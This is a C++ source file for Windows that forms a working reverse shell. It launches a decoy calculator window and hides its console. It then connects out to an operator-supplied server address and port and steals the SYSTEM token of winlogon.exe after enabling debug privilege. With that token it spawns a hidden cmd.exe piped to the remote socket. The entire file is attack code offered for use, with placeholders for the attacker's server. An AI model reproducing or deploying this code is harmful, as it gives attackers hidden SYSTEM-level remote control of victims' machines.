#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <tchar.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <lm.h>

#pragma comment(lib,"Advapi32.lib")
#pragma comment(lib,"user32.lib")
#pragma comment(lib,"ws2_32.lib")

using namespace std;

void ObfuscationProcess() {
    wchar_t process[] = L"C:\\Windows\\System32\\calc.exe";
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL, process, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        cerr << "Failed to open calculator: " << GetLastError() << endl;
        exit(0);
    }
    else {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

DWORD GetProcessId(LPCTSTR processName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        cerr << "Failed to create snapshot: " << GetLastError() << endl;
        return 1;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_tcscmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    else {
        cerr << "Process32First failed: " << GetLastError() << endl;
    }

    CloseHandle(hSnapshot);
    return pid;
}

void EnablePrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        cerr << "LookupPrivilegeValue error: " << GetLastError() << endl;
        return;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        cerr << "AdjustTokenPrivileges error: " << GetLastError() << endl;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        cerr << "The token does not have the specified privilege." << endl;
    }
}

int main(int argc, char* argv[]) {
#ifdef _WIN32
    ObfuscationProcess();
    Sleep(1000);
    FreeConsole();

    SOCKET client_shell;
    struct sockaddr_in client_addr;
    STARTUPINFO sinfo;
    wchar_t ip_address[] = L"192.168.1.1"; // write your server ip
    int port = 1337; // write your server port
    char data[8192];

    WSADATA wsadata;
    int connection;

    if (WSAStartup(MAKEWORD(2, 2), &wsadata) != 0) {
        cerr << "WSAStartup failed: " << GetLastError() << endl;
        return 1;
    }
    client_shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (client_shell == INVALID_SOCKET) {
        cerr << "WSASocket failed: " << WSAGetLastError() << endl;
        WSACleanup();
        return 1;
    }

    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(port);
    if (InetPton(AF_INET, ip_address, &client_addr.sin_addr) <= 0) {
        cerr << "Invalid address: " << WSAGetLastError() << endl;
        closesocket(client_shell);
        WSACleanup();
        return 1;
    }

    connection = WSAConnect(client_shell, (SOCKADDR*)&client_addr, sizeof(client_addr), NULL, NULL, NULL, NULL);
    if (connection == SOCKET_ERROR) {
        cerr << "Connection error: " << WSAGetLastError() << endl;
        closesocket(client_shell);
        WSACleanup();
        return 1;
    }
    recv(client_shell, data, sizeof(data), 0);
    memset(&sinfo, 0, sizeof(sinfo));

    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)client_shell;

    const TCHAR* processName = _T("winlogon.exe");
    DWORD pid_impersonate = GetProcessId(processName);

    if (pid_impersonate == 0) {
        cerr << "Failed to find process ID for " << processName << endl;
        closesocket(client_shell);
        WSACleanup();
        return 1;
    }

    wchar_t process[] = L"C:\\Windows\\System32\\cmd.exe";

    HANDLE hTokenHandle = NULL;
    HANDLE DuplicateTokenHandle = NULL;
    STARTUPINFO s;
    PROCESS_INFORMATION p;

    ZeroMemory(&s, sizeof(STARTUPINFO));
    ZeroMemory(&p, sizeof(PROCESS_INFORMATION));
    s.cb = sizeof(STARTUPINFO);
    s.hStdInput = s.hStdOutput = s.hStdError = (HANDLE)client_shell;
    s.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

    HANDLE CurrentTokenHandle = NULL;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &CurrentTokenHandle)) {
        cerr << "Error opening the process token: " << GetLastError() << endl;
        closesocket(client_shell);
        WSACleanup();
        return 1;
    }
    EnablePrivilege(CurrentTokenHandle, SE_DEBUG_NAME, TRUE);

    HANDLE rProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, TRUE, pid_impersonate);
    if (rProcess == NULL) {
        cerr << "Error opening the process: " << GetLastError() << endl;
        closesocket(client_shell);
        WSACleanup();
        return 1;
    }

    if (!OpenProcessToken(rProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hTokenHandle)) {
        cerr << "Error opening the process token: " << GetLastError() << endl;
        CloseHandle(rProcess);
        closesocket(client_shell);
        WSACleanup();
        return 1;
    }

    if (!DuplicateTokenEx(hTokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &DuplicateTokenHandle)) {
        cerr << "DuplicateToken error: " << GetLastError() << endl;
        CloseHandle(hTokenHandle);
        CloseHandle(rProcess);
        closesocket(client_shell);
        WSACleanup();
        return 1;
    }

    if (!CreateProcessWithTokenW(DuplicateTokenHandle, LOGON_WITH_PROFILE, process, NULL, CREATE_NO_WINDOW, NULL, NULL, &s, &p)) {
        cerr << "CreateProcessWithTokenW error: " << GetLastError() << endl;
        CloseHandle(DuplicateTokenHandle);
        CloseHandle(hTokenHandle);
        CloseHandle(rProcess);
        closesocket(client_shell);
        WSACleanup();
        return 1;
    }

    CloseHandle(p.hProcess);
    CloseHandle(p.hThread);
    CloseHandle(DuplicateTokenHandle);
    CloseHandle(hTokenHandle);
    CloseHandle(rProcess);

#else
    cerr << "[-] OS is not Windows [-]";

#endif
    return 0;
}
